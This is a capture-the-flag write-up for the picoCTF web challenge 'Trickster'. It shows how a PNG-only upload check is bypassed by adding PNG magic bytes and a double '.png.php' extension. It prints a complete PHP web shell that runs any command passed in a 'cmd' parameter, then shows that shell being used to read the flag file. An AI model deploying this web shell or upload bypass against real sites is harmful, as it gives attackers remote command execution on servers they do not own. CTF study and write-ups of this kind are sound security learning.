# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : Trickster
# Descriptio
found a web app that can help process images: PNG images only! Try it
# Information Gathering
Only accepts PNG image files
<img width="1597" height="778" alt="1" src="https://github.com/user-attachments/assets/a6ef4611-48d0-4bb2-873f-83575d57161e" />


When examining the site or reviewing hidden cash files such as robots.txt or instructions.txt, you will discover that the site:
<img width="1591" height="600" alt="2" src="https://github.com/user-attachments/assets/3dde0e02-34be-442d-9191-1ce536344f01" />
Verifies the file's digital signature, or Magic Bytes, to ensure it is a genuine image
<img width="1599" height="781" alt="g" src="https://github.com/user-attachments/assets/67cb3115-011c-4326-9b78-e4d78afbaca6" />

# Crafting the Payload
to bypass filter we need add Magic Bytes to our file ,in our case we can add PNG on first line of file like this
<img width="1598" height="825" alt="5" src="https://github.com/user-attachments/assets/f91fc941-3c75-472d-840f-00b94088b58e" />

     PNG
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
       if(isset($_GET['cmd']))
      {
          system($_GET['cmd'] . ' 2>&1');
      }
    ?>
    </pre>
    </body>
    </html>

and file must be has png and php file extension
hack.png.php like this
# Uploading & Execution
after we upload payload we get this and file is uploding 
<img width="1599" height="780" alt="6" src="https://github.com/user-attachments/assets/140d6875-e2cb-4a61-aaa9-bac1e10c8e5a" />
and to get webshell we need to add file name to endpoint url in path /uploads/hack.png.php like that
<img width="1598" height="779" alt="7" src="https://github.com/user-attachments/assets/9dc5d28f-ec15-4eb7-94ef-68ce14d04189" />
and we need to serch flag as we see is in /var/www/htmlGBRDKM3FGA2TQ.txt
and use cat to show us txt file 
<img width="1596" height="783" alt="8" src="https://github.com/user-attachments/assets/92c28428-2384-40c0-9084-338a98668222" />
get flag!








